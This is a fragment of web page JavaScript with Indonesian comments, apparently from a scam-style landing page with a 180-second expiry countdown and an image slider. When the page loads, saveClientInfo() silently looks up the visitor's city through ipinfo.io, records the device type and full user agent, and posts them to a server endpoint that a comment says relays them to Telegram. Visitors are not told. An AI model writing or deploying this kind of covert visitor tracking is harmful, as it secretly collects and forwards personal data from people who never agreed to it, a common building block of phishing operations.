<script>
  let countdown;
  function startTimer(duration) {
    let timer = duration;
    const timerDisplay = document.getElementById('timer');
    clearInterval(countdown);
    countdown = setInterval(() => {
      if (timerDisplay) timerDisplay.textContent = `${timer}s`;
      timer--;
      if (timer < 0) {
        clearInterval(countdown);
        if (timerDisplay) timerDisplay.textContent = "Kadaluarsa";
      }
    }, 1000);
  }

  async function saveClientInfo() {
    try {
      const res = await fetch("https://ipinfo.io/json");
      const data = await res.json();

      const kota = data.city || "Tidak diketahui";
      let deviceType = "Tidak diketahui";
      if (/android/i.test(navigator.userAgent)) deviceType = "Android";
      else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
      else deviceType = "PC/Laptop";
      const deviceName = navigator.userAgent;

      // ✅ KIRIM KE NODE.JS → TELEGRAM
      await fetch("/kirim-info", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ kota, deviceType, deviceName })
      });
    } catch (error) {
      console.warn("Gagal ambil data lokasi/device", error);
    }
  }

  window.onload = () => {
    saveClientInfo();
    startTimer(180);
  };

  // Modal Buttons
  const closeBtn = document.getElementById("closePopupBtn");
  const nextBtn = document.getElementById("nextBtn");
  if (closeBtn) closeBtn.addEventListener("click", () => window.location.href = "index.html");
  if (nextBtn) nextBtn.addEventListener("click", () => location.reload());
</script>

<script>
  // Slider tetap sama
  let index = 0;
  const slides = document.querySelector(".slides");
  const indicators = document.querySelectorAll(".indicators span");
  const totalSlides = document.querySelectorAll(".slides img").length;

  function updateIndicators() {
    indicators.forEach((indicator, i) => {
      indicator.classList.toggle("active", i === index);
    });
  }

  function slideShow() {
    index = (index + 1) % totalSlides;
    slides.style.transform = `translateX(${-index * 100}%)`;
    updateIndicators();
  }

  if (totalSlides > 0) {
    setInterval(slideShow, 4000);
    indicators.forEach((indicator, i) => {
      indicator.addEventListener("click", () => {
        index = i;
        slides.style.transform = `translateX(${-index * 100}%)`;
        updateIndicators();
      });
    });
    updateIndicators();
  }
</script>
